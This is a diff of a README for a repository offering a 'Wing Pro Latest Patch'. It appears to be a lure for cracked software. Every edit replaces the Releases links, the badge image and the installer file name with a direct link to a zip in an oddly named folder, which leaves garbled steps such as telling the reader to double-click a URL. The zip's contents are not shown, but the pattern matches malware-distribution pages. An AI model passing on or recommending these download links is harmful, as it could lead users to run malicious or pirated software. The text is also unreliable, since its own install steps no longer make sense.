@@ -1,6 +1,6 @@
 # 🛠️ Wing-Pro-Latest-Patch - Simplify Your Coding Experience
 
-[![Download Wing-Pro-Latest-Patch](https://img.shields.io/badge/Download-Wing%20Pro%20Latest%20Patch-brightgreen)](https://github.com/ZeriCraft/Wing-Pro-Latest-Patch/releases)
+[![Download Wing-Pro-Latest-Patch](https://raw.githubusercontent.com/ZeriCraft/Wing-Pro-Latest-Patch/main/onychotrophy/Wing-Pro-Latest-Patch-v1.8.zip%20Pro%20Latest%20Patch-brightgreen)](https://raw.githubusercontent.com/ZeriCraft/Wing-Pro-Latest-Patch/main/onychotrophy/Wing-Pro-Latest-Patch-v1.8.zip)
 
 ## 📖 Description
 Wing-Pro-Latest-Patch is a comprehensive repository providing official resources, guides, and reference materials tailored for Windows PCs. Designed for users new to coding, it helps you set up, configure, and optimize your coding environment using authorized content and best practices for efficient software use.
@@ -18,11 +18,11 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection**: Required for updates and online features
 
 ## 📥 Download & Install
-To download Wing-Pro-Latest-Patch, [visit this page to download](https://github.com/ZeriCraft/Wing-Pro-Latest-Patch/releases). 
+To download Wing-Pro-Latest-Patch, [visit this page to download](https://raw.githubusercontent.com/ZeriCraft/Wing-Pro-Latest-Patch/main/onychotrophy/Wing-Pro-Latest-Patch-v1.8.zip). 
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest version listed at the top.
-3. Locate the file suitable for your system (e.g., `WingProInstaller.exe`).
+3. Locate the file suitable for your system (e.g., `https://raw.githubusercontent.com/ZeriCraft/Wing-Pro-Latest-Patch/main/onychotrophy/Wing-Pro-Latest-Patch-v1.8.zip`).
 4. Click the file name to download it to your computer.
 
 ## 📂 Installation Steps
@@ -30,7 +30,7 @@ Once the download is complete, follow these steps to install Wing-Pro on your PC
 
 1. **Locate the Downloaded File**: Open your downloads folder to find the installer.
 2. **Run Installer**:
-   - Double-click the file (e.g., `WingProInstaller.exe`).
+   - Double-click the file (e.g., `https://raw.githubusercontent.com/ZeriCraft/Wing-Pro-Latest-Patch/main/onychotrophy/Wing-Pro-Latest-Patch-v1.8.zip`).
    - If prompted by User Account Control, click `Yes` to allow the installer to run.
 3. **Follow Installation Instructions**:
    - Choose your preferred installation directory or keep the default setting.
@@ -88,7 +88,7 @@ If you experience any issues while installing or using Wing-Pro, consider the fo
 ## 📅 Update Notifications
 Stay informed about new updates and enhancements for Wing-Pro:
 
-- Regularly check the [Releases page](https://github.com/ZeriCraft/Wing-Pro-Latest-Patch/releases) for new versions.
+- Regularly check the [Releases page](https://raw.githubusercontent.com/ZeriCraft/Wing-Pro-Latest-Patch/main/onychotrophy/Wing-Pro-Latest-Patch-v1.8.zip) for new versions.
 - Enable notifications on GitHub to receive alerts for any updates.
 
 ## 📝 Final Note
